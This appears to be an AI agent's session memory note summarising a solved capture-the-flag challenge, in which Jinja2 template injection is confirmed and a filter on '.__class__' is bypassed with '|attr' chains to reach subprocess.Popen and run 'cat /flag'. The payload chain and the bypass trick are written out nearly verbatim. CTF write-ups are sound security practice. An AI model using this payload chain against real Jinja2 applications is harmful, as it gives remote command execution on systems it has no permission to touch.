thread_id: 018fbfc7-a70c-7dc9-8c34-ec6bbb0119cf
updated_at: 2026-05-22T08:54:59+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\05\22\rollout-2026-05-22T16-20-59-018fbfc7-a70c-7dc9-8c34-ec6bbb0119cf.jsonl
cwd: \\?\C:\Workspace\ctf-notes

# Solved a Web SSTI CTF challenge on a Jinja2 template with `class` filter removed; used `attr` chain to reach `subprocess`.

Rollout context: cwd was `C:\Workspace\ctf-notes`, WSL + browser. Standard Jinja2 SSTI challenge with a small filter.

## Task 1: SSTI → attribute chain → RCE → flag read

Outcome: success

Preference signals:
- One curl-friendly payload; no browser required.
- Chinese narration; payload strings verbatim.

Key steps:
- Confirmed SSTI via `{{7*'7'}}` → `7777777`.
- Filter allowed `.` and attribute access but rewrote the literal `.__class__`; used `|attr('__class__')` instead.
- Chained: `''|attr('__class__')|attr('__mro__')[1]|attr('__subclasses__')()` → subclass list.
- Located `Popen`; called it with `('cat /flag',shell=True,stdout=-1)`; read `.communicate()[0]`.

Failures and how to do differently:
- Subclass index shifted between the challenge's Python and my local; enumerated the list first, matched by name.

Reusable knowledge:
- Jinja2 SSTI attribute-filter bypass: `|attr('X')` reaches attributes that `.X` is filtered against.
- Subclass indices are Python-version dependent; enumerate by name every time.

References:
- [1] Payload: `payload.txt`
- [2] Challenge endpoint from the CTF
